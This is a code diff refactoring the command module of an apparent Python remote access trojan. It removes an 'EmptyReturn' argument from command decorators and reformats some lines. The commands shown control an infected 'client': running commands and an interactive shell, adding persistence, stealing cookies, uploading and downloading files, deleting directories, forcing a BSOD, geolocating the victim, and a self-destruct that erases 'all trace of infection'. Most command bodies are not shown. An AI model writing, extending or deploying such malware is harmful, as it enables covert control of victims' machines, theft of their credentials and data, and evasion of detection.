@@ -4,7 +4,6 @@ from shared.extras.double_command import (
     CommandResult,
     DoubleCommand,
     ArgumentType,
-    EmptyReturn,
     recieve_maximum_bytes,
     recieve_integer,
     recieve_string,
@@ -26,7 +25,6 @@ import socket
     "kill_proc [ pid ]",
     "Kills a process on the client",
     [ArgumentType.integer],
-    EmptyReturn,
 )
 class KillProcess(DoubleCommand):
     @staticmethod
@@ -149,13 +147,7 @@ class LaunchExecutableFile(DoubleCommand):
         return CommandResult(DoubleCommandResult.success, proc_pid)
 
 
-@add_double_command(
-    "invoke_bsod",
-    "invoke_bsod",
-    "Invokes a BSOD on the client",
-    [],
-    EmptyReturn,
-)
+@add_double_command("invoke_bsod", "invoke_bsod", "Invokes a BSOD on the client", [])
 class InvokeBSOD(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
@@ -198,7 +190,6 @@ class InvokeBSOD(DoubleCommand):
     "show_image [ local image path ]",
     "Displays an image on the clients screen",
     [ArgumentType.string],
-    EmptyReturn,
     required_client_modules=["Pillow"],
 )
 class ShowImage(DoubleCommand):
@@ -309,7 +300,6 @@ class TakeScreenshot(DoubleCommand):
     "typewrite [ string to type ] { character delay }",
     "Types a string on the clients keyboard",
     [ArgumentType.string, ArgumentType.optional_float],
-    EmptyReturn,
     required_client_modules=["pyautogui"],
 )
 class TypeWrite(DoubleCommand):
@@ -356,7 +346,6 @@ class TypeWrite(DoubleCommand):
     "run_command [ command ]",
     "Runs a command on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class RunCommand(DoubleCommand):
     @staticmethod
@@ -634,7 +623,6 @@ class AddPersistence(DoubleCommand):
     "reboot { delay seconds }",
     "Reboots the client PC",
     [ArgumentType.optional_float],
-    EmptyReturn,
 )
 class Reboot(DoubleCommand):
     @staticmethod
@@ -679,7 +667,6 @@ class Reboot(DoubleCommand):
     "shutdown { delay seconds }",
     "Turns off the client PC",
     [ArgumentType.optional_float],
-    EmptyReturn,
 )
 class Shutdown(DoubleCommand):
     @staticmethod
@@ -724,7 +711,6 @@ class Shutdown(DoubleCommand):
     "self_destruct",
     "Self destructs and removes all trace of infection on the client side",
     [],
-    EmptyReturn,
 )
 class SelfDestruct(DoubleCommand):
     @staticmethod
@@ -869,7 +855,6 @@ class CookieStealer(DoubleCommand):
     "upload [ local path ] [ client side path ]",
     "Uploads a file or folder to the client",
     [ArgumentType.string, ArgumentType.string],
-    EmptyReturn,
 )
 class UploadItem(DoubleCommand):
     @staticmethod
@@ -1008,7 +993,6 @@ class UploadItem(DoubleCommand):
     "download [ client side path ] [ local path ]",
     "Downloads a file or folder from the client",
     [ArgumentType.string, ArgumentType.string],
-    EmptyReturn,
 )
 class DownloadItem(DoubleCommand):
     @staticmethod
@@ -1164,7 +1148,6 @@ class DownloadItem(DoubleCommand):
     "open_url [ url ]",
     "Opens a URL in a new webbrowser on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class OpenURL(DoubleCommand):
     @staticmethod
@@ -1212,11 +1195,7 @@ class OpenURL(DoubleCommand):
 
 
 @add_double_command(
-    "ls",
-    "ls [ directory ]",
-    "Lists a directory on the client",
-    [ArgumentType.string],
-    EmptyReturn,
+    "ls", "ls [ directory ]", "Lists a directory on the client", [ArgumentType.string]
 )
 class ListDirectory(DoubleCommand):
     @staticmethod
@@ -1263,7 +1242,6 @@ class ListDirectory(DoubleCommand):
     "mkdir [ directory path ]",
     "Creates a directory on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class MakeDirectory(DoubleCommand):
     @staticmethod
@@ -1334,7 +1312,6 @@ class MakeDirectory(DoubleCommand):
     "rmdir [ directory path ]",
     "Recursively deletes a directory on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class DeleteDirectory(DoubleCommand):
     @staticmethod
@@ -1403,11 +1380,7 @@ class DeleteDirectory(DoubleCommand):
 
 
 @add_double_command(
-    "del",
-    "del [ file path ]",
-    "Deletes a file on the client",
-    [ArgumentType.string],
-    EmptyReturn,
+    "del", "del [ file path ]", "Deletes a file on the client", [ArgumentType.string]
 )
 class DeleteFile(DoubleCommand):
     @staticmethod
@@ -1480,7 +1453,6 @@ class DeleteFile(DoubleCommand):
     "touch [ file path ]",
     "Creates a file on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class Touch(DoubleCommand):
     @staticmethod
@@ -1601,7 +1573,6 @@ class ListProcesses(DoubleCommand):
     "chdir [ path ]",
     "Changes the working directory on the client",
     [ArgumentType.string],
-    EmptyReturn,
 )
 class ChangeCWD(DoubleCommand):
     @staticmethod
@@ -1667,7 +1638,6 @@ class ChangeCWD(DoubleCommand):
     "clipboard_set [ string to set ]",
     "Sets the clipboard value on the client",
     [ArgumentType.string],
-    EmptyReturn,
     required_client_modules=["pyperclip"],
 )
 class SetClipboard(DoubleCommand):
@@ -1730,7 +1700,6 @@ class GetClipboard(DoubleCommand):
     "popup [ title ] [ message ]",
     "Displays a popup message on the clients screen",
     [ArgumentType.string, ArgumentType.string],
-    EmptyReturn,
 )
 class Popup(DoubleCommand):
     @staticmethod
@@ -1882,7 +1851,6 @@ class Geolocate(DoubleCommand):
     "shell",
     "Runs and interactive shell on the client",
     [],
-    EmptyReturn,
     no_new_process=True,
     no_multitask=True,
     max_selected=1,
@@ -1999,7 +1967,6 @@ class Shell(DoubleCommand):
     "playsound [ local file path ]",
     "Plays a sound file on the client",
     [ArgumentType.string],
-    EmptyReturn,
     required_client_modules=["pyglet"],
 )
 class PlaySound(DoubleCommand):
@@ -2034,7 +2001,9 @@ class PlaySound(DoubleCommand):
         with open(sound_file, "wb") as sound_file_fd:
             sound_file_fd.write(sound_contents)
 
-        multiprocessing.Process(target=PlaySound.play_sound, args=[sound_file], name="Play sound").start()
+        multiprocessing.Process(
+            target=PlaySound.play_sound, args=[sound_file], name="Play sound"
+        ).start()
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
